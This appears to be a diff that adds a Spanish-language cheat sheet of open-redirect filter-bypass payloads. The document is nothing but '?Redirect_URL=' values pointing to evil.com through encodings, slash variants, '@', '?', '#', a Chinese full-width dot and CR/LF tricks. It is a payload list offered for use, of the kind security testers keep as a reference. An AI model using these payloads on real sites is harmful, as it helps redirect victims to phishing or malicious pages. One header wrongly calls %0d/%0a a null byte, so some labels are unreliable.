@@ -1,1 +1,57 @@
 
+░█▀▀▀█ █▀▀█ █▀▀ █▀▀▄ 　 ░█▀▀█ █▀▀ █▀▀▄ ─▀─ █▀▀█ █▀▀ █▀▀ ▀▀█▀▀ 
+░█──░█ █──█ █▀▀ █──█ 　 ░█▄▄▀ █▀▀ █──█ ▀█▀ █▄▄▀ █▀▀ █── ──█── 
+░█▄▄▄█ █▀▀▀ ▀▀▀ ▀──▀ 　 ░█─░█ ▀▀▀ ▀▀▀─ ▀▀▀ ▀─▀▀ ▀▀▀ ▀▀▀ ──▀──
+_____________________________________________________________
+
+
+::. Redirección de Dominio Simple .::
+?Redirect_URL=https://evil.com
+
+
+::. Evadir Filtro cuando el Protocolo está en la Lista Legra mediante // .::
+?Redirect_URL=//evil.com
+
+
+::. Evadir Filtro cuando la Doble Barra está en la Lista Negra mediante \\ .::
+?Redirect_URL=\evil.com
+?Redirect_URL=\\evil.com
+
+
+::. Evadir Filtro cuando la Doble Barra está en la Lista Negra mediante http: o https: .::
+?Redirect_URL=http:evil.com
+?Redirect_URL=https:evil.com
+
+
+::. Evadir Filtro usando @ => %40 ..:
+?Redirect_URL=target.com%40evil.com
+
+
+::. Evadir Filtro si Sólo Comprueba el Nombre de Dominio .::
+?Redirect_URL=target.comevil.com
+
+
+::. Evadir Filtro si Sólo Comprueba si el Nombre de Dominio Utiliza un punto => %2e .::
+?Redirect_URL=target.com%2eevil.com
+
+
+::. Evadir Filtro si Sólo Comprueba el Nombre de Dominio mediante un Signo de Interrogación/Consulta => ? .::
+?Redirect_URL=evil.com?target.com
+
+
+::. Evadir Filtro si Sólo Comprueba si el Nombre de Dominio Utiliza un hash # => %23 .::
+?Redirect_URL=evil.com%23target.com
+
+
+::. Evadir Filtro usando el símbolo º .::
+?Redirect_URL=target.com/ºevil.com
+
+
+::. Evadir Filtro usando un Punto Codificado en Chino en la URL => %E3%80%82 .::
+?Redirect_URL=evil.com%E3%80%82target.com
+?Redirect_URL=evil.com%E3%80%82%23target.com
+
+
+::. Evadir Filtro si sólo Permite Controlar la Ruta Mediante un Nullbyte => %0d ó %0a .::
+?Redirect_URL=target.com/%0d/evil.com
+?Redirect_URL=target.com/%0a/evil.com
